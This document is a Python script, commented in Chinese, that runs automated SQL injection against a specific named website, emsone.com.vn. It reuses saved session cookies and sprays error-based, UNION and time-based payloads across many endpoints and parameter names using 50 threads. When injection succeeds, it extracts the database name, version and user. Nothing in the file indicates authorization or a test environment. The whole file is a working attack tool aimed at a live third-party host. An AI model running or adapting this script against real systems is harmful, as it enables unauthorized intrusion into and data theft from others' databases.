#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import urllib.parse
import json
import time
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

class TestAllEndpointsSQLi:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.working_endpoints = []
        self.db_info = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def load_endpoints(self):
        """加载所有端点"""
        try:
            with open('all_endpoints.json', 'r') as f:
                data = json.load(f)
                return data.get('all_endpoints', [])
        except:
            return []
    
    def test_endpoint_sqli(self, endpoint, param, payload, method='GET'):
        """测试端点SQL注入"""
        try:
            if method == 'GET':
                url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                start = time.time()
                r = self.session.get(url, timeout=15)
                elapsed = time.time() - start
            elif method == 'POST':
                data = {param: payload}
                start = time.time()
                r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=15)
                elapsed = time.time() - start
            else:
                return None
            
            has_test = 'TEST' in r.text
            has_xpath = 'XPATH' in r.text.upper()
            has_delay = elapsed > 4
            len_diff = len(r.text)
            
            if has_test or has_xpath or has_delay:
                result = {
                    'endpoint': endpoint,
                    'param': param,
                    'method': method,
                    'payload': payload,
                    'status': r.status_code,
                    'len': len(r.text),
                    'has_test': has_test,
                    'has_xpath': has_xpath,
                    'has_delay': has_delay,
                    'elapsed': elapsed,
                    'response_preview': r.text[:500]
                }
                
                if has_xpath:
                    match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                    if match:
                        result['extracted'] = match.group(1)
                
                return result
        except:
            pass
        
        return None
    
    def extract_database(self, endpoint, param, method='GET'):
        """提取数据库"""
        queries = [
            ('SELECT database()', '数据库名'),
            ('SELECT version()', '版本'),
            ('SELECT user()', '用户'),
        ]
        
        for query, label in queries:
            payload = f"1' AND EXTRACTVALUE(1, CONCAT(0x7e, ({query}), 0x7e))--"
            
            try:
                if method == 'GET':
                    url = f"{self.base_url}{endpoint}?{param}={urllib.parse.quote(payload)}"
                    r = self.session.get(url, timeout=10)
                else:
                    data = {param: payload}
                    r = self.session.post(f"{self.base_url}{endpoint}", data=data, timeout=10)
                
                match = re.search(r"XPATH syntax error: '~([^']+)~'", r.text, re.IGNORECASE)
                if match:
                    value = match.group(1)
                    if value and len(value) > 0:
                        print(f"        [+] {label}: {value}")
                        self.db_info[label] = value
                        return value
            except:
                pass
        
        return None
    
    def test_all(self):
        """测试所有端点"""
        print("="*60)
        print("测试所有端点SQL注入")
        print("="*60)
        
        endpoints = self.load_endpoints()
        print(f"\n[*] 加载 {len(endpoints)} 个端点")
        
        # 参数列表
        params = ['id', 'ID', 'Id', 'user_id', 'userID', 'userId', 'customer_id', 'customerID',
                  'q', 'query', 'search', 'keyword', 'name', 'email', 'mobile', 'phone',
                  'MobileNumber', 'Email', 'Password', 'Type', 'DistrictID', 'ProvinceID',
                  'WareHouseID', 'GroupPermissionID', 'username', 'user', 'uid', 'page', 'pageSize',
                  'pageIndex', 'limit', 'offset', 'sort', 'order', 'filter', 'status']
        
        # Payload列表
        payloads = [
            "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
            "1' AND updatexml(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e), 1)--",
            "1' UNION SELECT 'TEST'--",
            "1' AND SLEEP(5)--",
        ]
        
        methods = ['GET', 'POST']
        
        print(f"\n[*] 开始测试...")
        print(f"    端点: {len(endpoints)}")
        print(f"    参数: {len(params)}")
        print(f"    Payload: {len(payloads)}")
        print(f"    方法: {len(methods)}")
        print(f"    总测试数: {len(endpoints) * len(params) * len(payloads) * len(methods)}")
        
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            for endpoint in endpoints:
                # 跳过明显不是API的端点
                if any(endpoint.endswith(ext) for ext in ['.js', '.css', '.png', '.jpg', '.gif', '.svg', '.ico', '.woff', '.ttf']):
                    continue
                
                for param in params:
                    for payload in payloads:
                        for method in methods:
                            futures.append(executor.submit(self.test_endpoint_sqli, endpoint, param, payload, method))
            
            count = 0
            for future in as_completed(futures):
                count += 1
                if count % 100 == 0:
                    print(f"    [*] 已测试: {count}/{len(futures)}")
                
                result = future.result()
                if result:
                    print(f"\n    [!] {result['method']} {result['endpoint']} [{result['param']}]")
                    print(f"        XPATH: {result['has_xpath']}, 延迟: {result['has_delay']}, 长度: {result['len']}")
                    if result.get('extracted'):
                        print(f"        [+] 提取: {result['extracted']}")
                    self.working_endpoints.append(result)
                    
                    # 如果发现XPATH错误，尝试提取数据库
                    if result['has_xpath']:
                        self.extract_database(result['endpoint'], result['param'], result['method'])
        
        # 保存结果
        with open('all_endpoints_sqli_results.json', 'w', encoding='utf-8') as f:
            json.dump({
                'working_endpoints': self.working_endpoints,
                'db_info': self.db_info
            }, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("测试结果")
        print("="*60)
        print(f"有效注入点: {len(self.working_endpoints)}")
        print(f"数据库信息: {len(self.db_info)}")
        for k, v in self.db_info.items():
            print(f"  {k}: {v}")

if __name__ == "__main__":
    tester = TestAllEndpointsSQLi()
    tester.test_all()